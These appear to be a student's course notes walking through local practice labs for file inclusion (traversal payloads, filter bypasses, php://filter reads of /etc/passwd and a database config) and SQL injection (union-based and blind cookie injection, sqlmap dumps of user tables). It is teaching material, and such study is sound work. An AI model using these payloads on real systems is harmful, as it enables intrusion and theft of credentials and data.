
# ==Introduction to Local and Remote File Inclusion (LFI/RFI)==

LFI -> allows attacker to include file that are already present on the target server
RFI -> allows an attacker to include malicious file from an external location this can often lead to arbitrary code execution on the vulnerable server and essentially giving us an easy way in

It happen because an application is taking input from a user and using that path to a file without properly validating it e.g our application might allow a user to select a language and once a req is sent to a server where language equals German if we don't validate this input properly we might be able to change the input from German to ../../../ to achieve directory traversal allowing us to travel back up to the root dir and then appending etc passwd or etc slash passwd to include passwd file 

# ==Local File Inclusion Attacks==

## [Labs](http://localhost/index.php) / File Inclusion 0x01
url = `http://localhost/labs/fi0x01.php`

Go through and see what the application does
When we select a recipe it fetches the recipe and includes it on the page
Main thing to notice the file name is passed as part of the query string inside the parameter file name
e.g `http://localhost/labs/fi0x01.php?filename=chocolate_cake.txt`

Switch to burp and take a look whats going on 

```python
GET /labs/fi0x01.php?filename=chocolate_cake.txt HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost/labs/fi0x01.php?filename=
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```

Send it to repeater and test it 
Things to look for?
1 -> Target Host Running
e.g Linux -> etc/passwd
select a suitable payload or just fuzz it
e.g ../../../../../etc/passwd
send it to repeater select the area after 
filename= go to payload and select a payload and fuzz it 
and solve the first lab 
==============================================
# ==Remote File Inclusion Attacks==


## [Labs](http://localhost/index.php) / File Inclusion 0x02

## Select a recipe:


select a recipe and once again u see that its being passed in the url come to burp and take a look at this request

```python
GET /labs/fi0x02.php?filename=files%2Fchocolate_cake.txt HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://localhost/labs/fi0x02.php?filename=
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```

instead of looking for etc/passwd test for remote file inclusion where we fetch a remote resource 
first
`../../../../../../etc/passwd`
We get some warning here 
```python
Warning</b>:  file_get_contents(etc/passwd): failed to open stream: No such file or directory in <b>/var/www/html/labs/fi0x02.php</b>
```
Our payload ../ is being filtered Few ways to bypass this first is encoding 
On the burp suite select the payload 
Convert Selection -> URL -> URL Encoding All Characters And Hit Send 
unfortunately this will be translated back to ../../../../ the filter will kick it 
we can encode twice sometimes to bypass filters
The other Thing to Check for is
*Filter is Recursive* 
..././..././..././..././etc/passwd
```python
div class="file-content">
                    root:x:0:0:root:/root:/bin/bash<br />
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br />
bin:x:2:2:bin:/bin:/usr/sbin/nologin<br />
sys:x:3:3:sys:/dev:/usr/sbin/nologin<br />
sync:x:4:65534:sync:/bin:/bin/sync<br />
games:x:5:60:games:/usr/games:/usr/sbin/nologin<br />
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br />
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br />
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br />
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br />
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br />
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br />
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br />
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br />
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br />
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br />
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br />
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br />
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br />
                </div>
```


Now we will try Remote File Inclusion 
```python
GET /labs/fi0x02.php?filename=https://www.google.com HTTP/1.1
```

and if we some file content we have remote file inclusion  which is also a great find as well We can now fetch files from remote resources
**PAY LOADS OF ALL THE THINGS**

`php://filter/convert.base64-encode/resource=index.php`
change resource= to db.php
It will return a warning now again recursive and bypass the filters
```python
GET /labs/fi0x02.php?filename=php://filter/convert.base64-encode/resource=..././db.php HTTP/1.1
```

The Output We Receive is this 

```html
               <div class="file-content">
                    PD9waHAKCiRzZXJ2ZXJuYW1lID0gImJiLWRiIjsKJHVzZXJuYW1lID0gImJiLWxhYnMtdXNlciI7CiRwYXNzd29yZCA9ICJiYi1sYWJzLXBhc3N3b3JkIjsKJGRibmFtZSA9ICJiYi1sYWJzIjsKCiRjb25uID0gbmV3IG15c3FsaSgkc2VydmVybmFtZSwgJHVzZXJuYW1lLCAkcGFzc3dvcmQsICRkYm5hbWUpOwoKaWYgKCRjb25uLT5jb25uZWN0X2Vycm9yKSB7CiAgICBkaWUoIkNvbm5lY3Rpb24gZmFpbGVkOiAiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwp9Cg==                </div>
```

its encode in base64 Send it to Decoder using burp and decode the base64 string 
```php
<?php

$servername = "bb-db";
$username = "bb-labs-user";
$password = "bb-labs-password";
$dbname = "bb-labs";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
  
```

## [Labs](http://localhost/index.php) / File Inclusion 0x03 [Challenge]

![](http://localhost/assets/rolling-scones.png)


Capture the request and try using FFUF instead of burp intruder 
and make file api-req.txt and put the request in it and make a FUZZ 
```
GET /labs/api/fetchRecipe.php?filename=FUZZ HTTP/1.1

```

```python
┌──(cyber㉿kali)-[~/tmp]
└─$ ffuf -request api-req.txt -request-proto http -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
```

Now we will get a lot of result so narrow it down if notice that the word count is 19 so putting a filter would work
```python 
┌──(cyber㉿kali)-[~/tmp]
└─$ ffuf -request api-req.txt -request-proto http -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fw 19
```

copy the payload and check it using burp 
`..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00`

Still receiving a warning So again make a filter by observing the request and word count
```python
┌──(cyber㉿kali)-[~/tmp]
└─$ ffuf -request api-req.txt -request-proto http -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fw 19,20
```

We got this payload 
`....//....//....//....//....//....//....//....//....//etc/passwd`

use it and Boom !! lab solved 
# ==Introduction to SQL Injection==

![[../Screenshot from 2024-06-13 05-39-41.png]]
Commands
`show databses;` -> use to show created data bases
`use DATA_BASE_NAME;`-> use to select the specific data 
`show tables;`->use to list the created tables
`select * from users;`-> use to select the tables item
`select age from users where username="jeremy";`
To select both users age on the basis of their usernames
`select age from users where username="jeremy" or username="jessamy";`
This would be call a SQL attack
```ts
MariaDB [sqldemo]> select age from users where username="jeremy" union select password from users;
+---------+
| age     |
+---------+
| 30      |
| letmein |
| kittems |
+---------+
3 rows in set (0.001 sec)

MariaDB [sqldemo]> 
```

If not familiar have a look at it `https://www.w3schools.com/sql/`

# ==Basic SQL Injection Attacks==

## [Labs](http://localhost/index.php) / Injection 0x01

## User search

search for `jeremy`
for now u will receive `Username: jeremy - Email: jeremy@example.com`

When u're accessing applications it's imp to try and take a little bit of time to understand
1 -> what's the intention of the application
2 -> what did the developers have in mind for each piece of functionality  
3 -> figure out how it works
This will help us find odd behaviour and vulnerabilities

To Test for SQL injection 
start with characters that might trigger an error like '  or "
e.g jeremy'  or jeremy"
and some other special character
Why would this trigger an error 
Often SQL queries are formed using single and double quotes and sending these characters can break the SQL statements and throw a database error which sometimes is printed back to us

Try logical operators this indicate whether we can control the SQL query 

jeremy' or 1=1#
back-end -> MySql
jeremy' or 1=1-- -

Union Keyword lets us retrieve information from other tables and columns that were not initially defined
jeremy' union select null# -> nothing founds
`jeremy' union select null,null,null# `depends on the number of column in the database
if got a result we know how many null are equal to how many columns are selected if theres not much info listed what happening in backend its selecting more info in backend but only outputting some of that to the screen for us to see

`jeremy' union select null,null,version()#`
should be able to query the version of the database 
we could grab some more info for example tables
`jeremy' union select null,null,table_name from information_schema.tables#`
All the tables that currently present on the data base 
For what Column Name Exist
`jeremy' union select null,null,column_name from information_schema.columns#`
We want to select the jeremys password for that we need to know the table name for this.. So listing the table again would show the current table whcih we are working with 
**Username: - Email: injection0x01**
so now
`jeremy' union select null,null,password from injection0x01#`
we will get this result 
```ts
Username: jeremy - Email: jeremy@example.com

Username: - Email: jeremyspassword

Username: - Email: jessamyspassword

Username: - Email: bobspassword
```
It selects all of the passwords from that column that we can use union select to exfiltrate other info from the database
if the user has an id and first one is int instead of a string so the email address is probably stored as a string id is stored as an integer if u try union select string into a column of integer will get in error so u have to playaround
`jeremy' union select null(int),1,null,null from injection0x01#`

Have to know how to dealt with it 
https://portswigger.net/web-security/sql-injection/cheat-sheet

# ==Blind SQL Injection Attacks - Part 1==

use of Burp Suite and SQL map
## [Labs](http://localhost/index.php) / Injection 0x02

Default credentials: jeremy:jeremy

## Login

Username

Password



Here we have default creds but the first thing application is test its functionality understand what it is doing and then look at what are the typical responses or what kind of behavior is happening 

login and capture the request
and we will get this welcome sign 
## [Labs](http://localhost/index.php) / Injection 0x02

Default credentials: jeremy:jeremy

## Welcome to your dashboard

this is what it seems the main functionality of the application once tested the functionality back to burp and have a look at the request post req username and password the payload 
 we have this in response
```
Set-Cookie: session=6967cabefd763ac1a1a88e11159957db; 
 
```

session id seems MD5 and scroll down we don't have the welcome to the dashboard so its look like we then probably get forwarded to there
so we send the session cookie we get this
welcome to the dashboard
One of the thing take a note on content length which seems

`Content-Length: 1928`

Test it for Injection send the request to the repeater which have the payload thing like the username and the password 

If modify the payload e.g password=password we will get different response and the content length 2122

username=jeremy' or 1=1#&password=password
and encode it 
so this payload will also give invalid creds content length 2122 which is not the original one
Use double quote instead and encode it again 
username=jeremy" or 1=1#&password=password

this will result in fail again same 2122 content length

**Automate**

capture the original request with password=password and save it to req.txt
```python
┌──(cyber㉿kali)-[~/Desktop/bugbounty]
└─$ touch req.txt      

┌──(cyber㉿kali)-[~/Desktop/bugbounty]
└─$ nano req.txt       

┌──(cyber㉿kali)-[~/Desktop/bugbounty]
└─$ sqlmap -r req.txt         
      __H__
 ___ ___[)]_____ ___ ___  {1.8.5#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
     |_|V...       |_|   https://sqlmap.org

```


output after hitting Y for the lab but for real world we should limit the request 

```bash
[16:48:30] [WARNING] POST parameter 'password' does not seem to be injectable
[16:48:30] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 16:48:30 /2024-06-19/
```

Now we have a choice we can go back to manual testing download a payload and try to fuzz it ourselves or do we look for other injections In this case its worth moving on to see what application has to offer 

Back to burp see the request of u'r cookie and this application must be processing it 
So whenever you think about about SQ-i think about everything you are supplying to the application and how it might be used 
THINK OUTSIDE OF THE BOX
what the application is using and what information is processing in our case it must be processing session cookie in some way cuz we got a welcome to our dashboard now sent the request to the intruder which has the session cookie 
set the target host to the localhost and capture the request and send it to repeater

```bash
GET /labs/i0x02.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: session=6967cabefd763ac1a1a88e11159957db
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
```
 the output content length success number is : Content-Length: 1027
 changing the session will change the content length means invalid or simply search for the welcome to the dashboard word 
 try changing this 
 
```python 
 Cookie: session=6967cabefd763ac1a1a88e11159957db' or 1=1#
```
 notice that content length didn't change or we can simple search for the welcome word and see its there the fact that **We are able to change or manipulate the session cookie add some SQL to it and give us the same response instead of failing it indication of SQL Injection** 

#  ==Blind SQL Injection Attacks - Part 2==

## Continue.....

This is blind SQL Injection and this is because the query is only changing behavior of the  application i.e it will display the message welcome to your dashboard or it will display the login form
Its not actually gives us data from the database Its not returning anything
just giving us the change in behavior
And we are going to have to have to create the payload that produce True/False output and then based on that behavior we can slowly extract data 
Simply -> We can ask the database simple Yes or No questions
e.g Is the first character of the username is A Yes/No 
These types of question essentially allow us to extract data or info that is not going to be returned on screen
Constructing a query that gets the version character by character from the database
After that look how to dump the data rest of the data from the table using SQL map
The function which will get info for us is actually called substring 

https://www.w3schools.com/sql/func_mysql_substr.asp

We have substring string start length
start -> might be the first character second character or third character
length -> is the number of character we want to extract 

```python
GET /labs/i0x02.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring('a', 1, 1) = 'a'#
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin

```

This is will result in the success of the content type and the welcome to the dashboard
But if we change this to the second character
```php
Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring('alex', 2, 1) = 'a'#
```
We will get a failed
but I made to matched the second character "l" for example
```php
Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring('alex', 2, 1) = 'l'#
```
We again get our success Or we can test for first 3 character directly "ale"
```php
Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring('alex', 1, 3) = 'ale'#
```
And again we will get a pass so we kind of understand of substring is doing and how it is working but we dont want to compare the string that we provide like "alex" is we are providing but actually  want to compare this to something that we grab from the database
Select the version of the database select a first character of a database version with a length of 1 
```php
Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring((select version()), 1, 1) = '7'#
```
 We get a failed change the 7 to 8
And we get a success
We know MySQL is version 8 
usually MySQL version are like 7.0.1 or 8.1.1
```php
Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring((select version()), 1, 2) = '8.'#
```
 Again success
 ```php
 Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring((select version()), 1, 3) = '8.0'#
```

It is 8.0 try 8.0.0
```php
Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring((select version()), 1, 5) = '8.0.0'#
```
Zero Matches 
```php
Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring((select version()), 1, 5) = '8.0.3'#
```
We got a Match 

We have enumerated or extracted the version of the database 
Now extract Jessamy's password as a challenge 
Manually but it will take long time

```php
Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring((select password from injection0x02 where username = "jessamy"), 1, 1) = 'a'#
```
 change a to b,c, d,e etc
  Send the request to the intruder 
  and marked that first character
```python
GET /labs/i0x02.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring((select password from injection0x02 where username = "jessamy"), 1, 1) = '§y§'#
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
```
Make the payload of all the keyboard character A to Z 

![[../Screenshot from 2024-06-20 03-08-14.png]]

We can continue this attack with intruder but lets have a look at it SQL map
grab this request and save it 

```python
GET /labs/i0x02.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: session=6967cabefd763ac1a1a88e11159957db
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
```
Lets run the My SQL test on it

```python
┌──(cyber㉿kali)-[~/Desktop/bugbounty]
└─$ sqlmap -r req.txt --level=2  --dump -T injection0x02
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.5#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:14:34 /2024-06-20/

[03:14:34] [INFO] parsing HTTP request from 'req.txt'
[03:14:34] [INFO] resuming back-end DBMS 'mysql' 
[03:14:34] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: session (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND 9789=9789 AND 'XMPb'='XMPb

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND (SELECT 1676 FROM (SELECT(SLEEP(5)))TGPD) AND 'SbkW'='SbkW
---
[03:14:34] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 7.4.33, Apache 2.4.54
back-end DBMS: MySQL >= 5.0.12
[03:14:34] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[03:14:34] [INFO] fetching current database
[03:14:34] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[03:14:34] [INFO] retrieved: 
do you want to URL encode cookie values (implementation specific)? [Y/n] n
bb-labs
[03:14:48] [INFO] fetching columns for table 'injection0x02' in database 'bb-labs'
[03:14:48] [INFO] retrieved: 4
[03:14:48] [INFO] retrieved: email
[03:14:48] [INFO] retrieved: password
[03:14:48] [INFO] retrieved: session
[03:14:49] [INFO] retrieved: username
[03:14:49] [INFO] fetching entries for table 'injection0x02' in database 'bb-labs'
[03:14:49] [INFO] fetching number of entries for table 'injection0x02' in database 'bb-labs'
[03:14:49] [INFO] retrieved: 2
[03:14:49] [INFO] retrieved: 6967cabefd763ac1a1a88e11159957db
[03:14:51] [INFO] retrieved: jeremy@example.com
[03:14:52] [INFO] retrieved: jeremy
[03:14:53] [INFO] retrieved: jeremy
[03:14:53] [INFO] retrieved: 9dedc6891e2839a791ed37157f1241fe
[03:14:55] [INFO] retrieved: jessamy@example.com
[03:14:56] [INFO] retrieved: ZWFzdGVyZWdn
[03:14:57] [INFO] retrieved: jessamy
[03:14:57] [INFO] recognized possible password hashes in column '`session`'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: bb-labs
Table: injection0x02
[2 entries]
+---------------------+--------------+----------+----------------------------------+
| email               | password     | username | session                          |
+---------------------+--------------+----------+----------------------------------+
| jeremy@example.com  | jeremy       | jeremy   | 6967cabefd763ac1a1a88e11159957db |
| jessamy@example.com | ZWFzdGVyZWdn | jessamy  | 9dedc6891e2839a791ed37157f1241fe |
+---------------------+--------------+----------+----------------------------------+

[03:15:00] [INFO] table '`bb-labs`.injection0x02' dumped to CSV file '/home/cyber/.local/share/sqlmap/output/localhost/dump/bb-labs/injection0x02.csv'
[03:15:00] [INFO] fetched data logged to text files under '/home/cyber/.local/share/sqlmap/output/localhost'

[*] ending @ 03:15:00 /2024-06-20/

                                                                                
┌──(cyber㉿kali)-[~/Desktop/bugbounty]
└─$ 


```

So here we notice that first character is upper case but we have used lower case instead both upper and lower case could still result in true
CHALLENEGE HINT
table name examples: injection0x03_products injection0x03_items

# ==SQL Injection Challenge Walkthrough==
## [Labs](http://localhost/index.php) / Injection 0x03 [Challenge]

![](http://localhost/assets/sushi.png)

## Product search

To view the full details of a product, please use the search below.

![](http://localhost/assets/tanjyoubi.png)

### Tanjyoubi Sushi Rack  
10,000円

![](http://localhost/assets/shougatsu.png)

### Shougatsu Sushi Rack  
20,000円

![](http://localhost/assets/senpai.png)

### Senpai Knife Set  
30,000円

![](http://localhost/assets/itamae.png)

### Itamae Knife Set  
45,000円

===============================================================

To check whether its has SQL injection just search for 
x' or 1=1#
is this is successful it should return all of the products in the database and it does
because the x is not found and the SQL statement probably says something like select all
from products where product name equals the user input or one equals one cuz one equals 1 is true is going to select all of the data
Find the data in the users table but we dont actually know what the table name is? Union select to get the number of columns
If we get the wrong number of columns what is going to happen is even though we probably can't see the error there will be an error and there should not be any results returned
Search for 
**Tanjyoubi Sushi Rack' union select null#** -> no result
**Tanjyoubi Sushi Rack' union select null, nulll#** -> no result
**Tanjyoubi Sushi Rack' union select null, null, null, null#** -> and we get a result
With Four Columns
Product label has only four columns or our query is only selecting these four columns from a larger table 


Lets Find a table name
  
![[../Screenshot from 2024-06-20 03-44-57.png]]

**`Tanjyoubi Sushi Rack' 'union select null,null,null, table_name from information_schema.tables#`**
 search for this
And it does indeed gives all of the tables name 
![[../Screenshot from 2024-06-20 03-49-19.png]]
 Now we have the product table and the user tables and this is what we want to use to steal the user data
![[../Pasted image 20240620035227.png]]

And after searching this we will get a user 

![[../Screenshot from 2024-06-20 03-53-49.png]]

Lets do the same but try password instead

![[../Screenshot from 2024-06-20 03-54-56.png]]

and we will get a password

![[../Screenshot from 2024-06-20 03-56-06.png]]

Lets try it with the SQL map
grab the post request and change the last part to product = test 

```python
POST /labs/i0x03.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Origin: http://localhost
Connection: close
Referer: http://localhost/labs/i0x03.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

product=test                                                                    
```

lets run the SQL map

```python
┌──(cyber㉿kali)-[~/Desktop/bugbounty]
└─$ sqlmap -r req.txt --level=2   -T injection0x03_users --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.5#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:00:22 /2024-06-20/

[04:00:22] [INFO] parsing HTTP request from 'req.txt'
[04:00:22] [INFO] testing connection to the target URL
[04:00:22] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:00:22] [INFO] testing if the target URL content is stable
[04:00:22] [INFO] target URL content is stable
[04:00:22] [INFO] testing if POST parameter 'product' is dynamic
[04:00:23] [WARNING] POST parameter 'product' does not appear to be dynamic
[04:00:23] [WARNING] heuristic (basic) test shows that POST parameter 'product' might not be injectable
[04:00:23] [INFO] testing for SQL injection on POST parameter 'product'
[04:00:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:00:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:00:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:00:23] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:00:23] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[04:00:23] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[04:00:23] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[04:00:24] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:00:24] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:00:24] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:00:24] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[04:00:24] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[04:00:24] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:00:24] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:00:24] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[04:00:24] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[04:00:24] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
[04:00:24] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
[04:00:24] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[04:00:24] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
[04:00:25] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:00:25] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:00:25] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:00:25] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[04:00:25] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)'
[04:00:25] [INFO] testing 'Generic inline queries'
[04:00:25] [INFO] testing 'MySQL inline queries'
[04:00:25] [INFO] testing 'PostgreSQL inline queries'
[04:00:25] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[04:00:25] [INFO] testing 'Oracle inline queries'
[04:00:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:00:25] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[04:00:25] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[04:00:25] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)'
[04:00:25] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[04:00:25] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:00:35] [INFO] POST parameter 'product' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (1) values? [Y/n] n
[04:01:07] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:01:07] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:01:07] [INFO] target URL appears to be UNION injectable with 4 columns
[04:01:07] [INFO] POST parameter 'product' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'product' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 282 HTTP(s) requests:
---
Parameter: product (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: product=test' AND (SELECT 3911 FROM (SELECT(SLEEP(5)))nzEu) AND 'HIdI'='HIdI

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: product=test' UNION ALL SELECT CONCAT(0x71626a7671,0x504a617a447a5971434e677963424f4e5a4f64456b6d615858726f7678795757706e786a4743594b,0x71717a7171),NULL,NULL,NULL-- -
---
[04:01:17] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.54, PHP 7.4.33
back-end DBMS: MySQL >= 5.0.12
[04:01:17] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[04:01:17] [INFO] fetching current database
[04:01:17] [INFO] fetching columns for table 'injection0x03_users' in database 'bb-labs'
[04:01:17] [INFO] fetching entries for table 'injection0x03_users' in database 'bb-labs'
Database: bb-labs
Table: injection0x03_users
[1 entry]
+------------------+----------+
| password         | username |
+------------------+----------+
| onigirigadaisuki | takeshi  |
+------------------+----------+

[04:01:17] [INFO] table '`bb-labs`.injection0x03_users' dumped to CSV file '/home/cyber/.local/share/sqlmap/output/localhost/dump/bb-labs/injection0x03_users.csv'
[04:01:17] [INFO] fetched data logged to text files under '/home/cyber/.local/share/sqlmap/output/localhost'

[*] ending @ 04:01:17 /2024-06-20/

                                                                                                                              
